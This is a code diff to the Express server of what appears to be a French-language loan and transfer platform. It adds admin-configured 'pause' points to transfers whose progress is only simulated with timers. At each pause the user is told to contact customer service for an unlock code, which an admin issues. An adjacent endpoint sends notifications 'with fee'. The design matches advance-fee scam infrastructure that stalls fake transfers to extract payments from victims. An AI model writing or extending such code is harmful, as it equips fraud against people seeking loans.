@@ -2,7 +2,7 @@ import type { Express } from "express";
 import express from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertLoanSchema, insertTransferSchema, insertUserSchema } from "@shared/schema";
+import { insertLoanSchema, insertTransferSchema, insertUserSchema, transferValidationCodes } from "@shared/schema";
 import bcrypt from "bcrypt";
 import { randomUUID, randomBytes } from "crypto";
 import { sendVerificationEmail, sendWelcomeEmail } from "./email";
@@ -12,6 +12,7 @@ import multer from "multer";
 import path from "path";
 import fs from "fs";
 import { fileTypeFromFile } from "file-type";
+import { db } from "./db";
 
 export async function registerRoutes(app: Express): Promise<Server> {
   app.use('/uploads', express.static(path.join(process.cwd(), 'uploads')));
@@ -1351,20 +1352,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
           metadata: null,
         });
 
-        setTimeout(async () => {
-          await storage.updateTransfer(transfer.id, {
-            status: 'completed',
-            progressPercent: 100,
-            completedAt: new Date(),
-          });
+        const settingPausePercentages = await storage.getAdminSetting('validation_pause_percentages');
+        const pausePercentages = (settingPausePercentages?.settingValue as number[]) || [];
+        
+        if (pausePercentages.length > 0) {
+          const nextPausePercent = pausePercentages[0];
+          setTimeout(async () => {
+            await storage.updateTransfer(transfer.id, {
+              progressPercent: nextPausePercent,
+              isPaused: true,
+              pausePercent: nextPausePercent,
+            });
 
-          await storage.createTransferEvent({
-            transferId: transfer.id,
-            eventType: 'completed',
-            message: 'Transfert complété avec succès',
-            metadata: null,
-          });
-        }, 5000);
+            await storage.createTransferEvent({
+              transferId: transfer.id,
+              eventType: 'paused',
+              message: `Transfert en pause à ${nextPausePercent}% - Code de déblocage requis`,
+              metadata: { pausePercent: nextPausePercent },
+            });
+
+            await storage.createAdminMessage({
+              userId: transfer.userId,
+              transferId: transfer.id,
+              subject: 'Code de déblocage requis',
+              content: `Votre transfert vers ${transfer.recipient} est en pause à ${nextPausePercent}%. Veuillez contacter le service client pour obtenir le code de déblocage.`,
+              severity: 'warning',
+            });
+          }, 3000);
+        } else {
+          setTimeout(async () => {
+            await storage.updateTransfer(transfer.id, {
+              status: 'completed',
+              progressPercent: 100,
+              completedAt: new Date(),
+            });
+
+            await storage.createTransferEvent({
+              transferId: transfer.id,
+              eventType: 'completed',
+              message: 'Transfert complété avec succès',
+              metadata: null,
+            });
+          }, 5000);
+        }
       }
 
       res.json({ 
@@ -2242,6 +2272,160 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: firstError.message });
       }
       res.status(500).json({ error: 'Failed to send notification with fee' });
+    }
+  });
+
+  app.post("/api/admin/transfers/:id/issue-pause-code", requireAdmin, requireCSRF, adminLimiter, async (req, res) => {
+    try {
+      const transfer = await storage.getTransfer(req.params.id);
+      if (!transfer) {
+        return res.status(404).json({ error: 'Transfer not found' });
+      }
+
+      if (!transfer.isPaused) {
+        return res.status(400).json({ error: 'Transfer is not paused' });
+      }
+
+      const nanoid = (await import('nanoid')).nanoid;
+      const code = nanoid(8).toUpperCase();
+      const expiresAt = new Date();
+      expiresAt.setMinutes(expiresAt.getMinutes() + 30);
+
+      await db.insert(transferValidationCodes).values({
+        transferId: transfer.id,
+        code,
+        deliveryMethod: 'admin',
+        codeType: 'pause',
+        sequence: transfer.pauseCodesValidated + 1,
+        pausePercent: transfer.pausePercent!,
+        expiresAt,
+      });
+
+      await storage.createAdminMessage({
+        userId: transfer.userId,
+        transferId: transfer.id,
+        subject: `Code de déblocage pour transfert en pause à ${transfer.pausePercent}%`,
+        content: `Votre code de déblocage est: ${code}. Ce code expire dans 30 minutes.`,
+        severity: 'info',
+      });
+
+      await storage.createAuditLog({
+        actorId: req.session.userId!,
+        actorRole: 'admin',
+        action: 'issue_pause_code',
+        entityType: 'transfer',
+        entityId: req.params.id,
+        metadata: { pausePercent: transfer.pausePercent },
+      });
+
+      res.json({ code, expiresAt });
+    } catch (error) {
+      console.error('Issue pause code error:', error);
+      res.status(500).json({ error: 'Failed to issue pause code' });
+    }
+  });
+
+  app.post("/api/transfers/:id/validate-pause-code", requireAuth, requireCSRF, validationLimiter, async (req, res) => {
+    try {
+      const { code } = req.body;
+      const transfer = await storage.getTransfer(req.params.id);
+      
+      if (!transfer) {
+        return res.status(404).json({ error: 'Transfer not found' });
+      }
+
+      if (transfer.userId !== req.session.userId) {
+        return res.status(403).json({ error: 'Accès refusé' });
+      }
+
+      if (!transfer.isPaused) {
+        return res.status(400).json({ error: 'Transfer is not paused' });
+      }
+
+      const validatedCode = await storage.validateCode(transfer.id, code, transfer.pauseCodesValidated + 1);
+      if (!validatedCode) {
+        await storage.createTransferEvent({
+          transferId: transfer.id,
+          eventType: 'pause_validation_failed',
+          message: 'Code de déblocage incorrect ou expiré',
+          metadata: { pausePercent: transfer.pausePercent },
+        });
+        return res.status(400).json({ error: 'Invalid or expired code' });
+      }
+
+      const newPauseCodesValidated = transfer.pauseCodesValidated + 1;
+      
+      await storage.updateTransfer(transfer.id, {
+        pauseCodesValidated: newPauseCodesValidated,
+        isPaused: false,
+        pausePercent: null,
+      });
+
+      await storage.createTransferEvent({
+        transferId: transfer.id,
+        eventType: 'pause_unlocked',
+        message: `Transfert débloqué - reprise de la progression`,
+        metadata: { previousPausePercent: transfer.pausePercent },
+      });
+
+      const settingPausePercentages = await storage.getAdminSetting('validation_pause_percentages');
+      const pausePercentages = (settingPausePercentages?.settingValue as number[]) || [];
+      const remainingPauses = pausePercentages.filter(p => p > (transfer.pausePercent || 0));
+
+      if (remainingPauses.length > 0) {
+        const nextPausePercent = remainingPauses[0];
+        setTimeout(async () => {
+          const currentTransfer = await storage.getTransfer(transfer.id);
+          if (!currentTransfer || currentTransfer.status === 'completed') return;
+
+          await storage.updateTransfer(transfer.id, {
+            progressPercent: nextPausePercent,
+            isPaused: true,
+            pausePercent: nextPausePercent,
+          });
+
+          await storage.createTransferEvent({
+            transferId: transfer.id,
+            eventType: 'paused',
+            message: `Transfert en pause à ${nextPausePercent}% - Code de déblocage requis`,
+            metadata: { pausePercent: nextPausePercent },
+          });
+
+          await storage.createAdminMessage({
+            userId: transfer.userId,
+            transferId: transfer.id,
+            subject: 'Code de déblocage requis',
+            content: `Votre transfert vers ${transfer.recipient} est en pause à ${nextPausePercent}%. Veuillez contacter le service client pour obtenir le code de déblocage.`,
+            severity: 'warning',
+          });
+        }, 3000);
+      } else {
+        setTimeout(async () => {
+          const currentTransfer = await storage.getTransfer(transfer.id);
+          if (!currentTransfer || currentTransfer.status === 'completed') return;
+
+          await storage.updateTransfer(transfer.id, {
+            status: 'completed',
+            progressPercent: 100,
+            completedAt: new Date(),
+          });
+
+          await storage.createTransferEvent({
+            transferId: transfer.id,
+            eventType: 'completed',
+            message: 'Transfert complété avec succès',
+            metadata: null,
+          });
+        }, 3000);
+      }
+
+      res.json({ 
+        success: true,
+        message: 'Code validé - transfert débloqué',
+      });
+    } catch (error) {
+      console.error('Validate pause code error:', error);
+      res.status(500).json({ error: 'Failed to validate pause code' });
     }
   });
 
